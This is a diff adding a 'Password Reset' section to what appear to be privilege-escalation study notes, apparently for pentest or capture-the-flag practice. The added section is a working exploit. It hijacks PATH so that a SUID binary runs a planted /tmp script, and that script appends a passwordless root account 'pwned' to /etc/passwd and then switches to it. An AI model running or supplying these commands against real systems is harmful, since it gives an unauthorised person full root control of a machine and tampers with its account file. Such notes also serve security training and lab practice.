@@ -41,6 +41,27 @@ Or if you want to save the output:
 ```
 The scripts will also do the same. You would need to share it. 
 
+## Password Reset
+This one, I really needed to learn about. If you see a RESET_PASSWD as a SUID
+
+```
+strace /home/user/RESET_PASSWD 2>&1 | grep -E "open|exec"
+```
+```
+strings /home/user/RESET_PASSWD
+```
+The win is here:
+```
+cat <<EOF > /tmp/chpasswd
+#!/bin/sh
+echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
+EOF
+chmod +x /tmp/chpasswd
+export PATH=/tmp:$PATH
+/home/user/RESET_PASSWD
+su pwned
+```
+
 ## linpeas
 
 ```
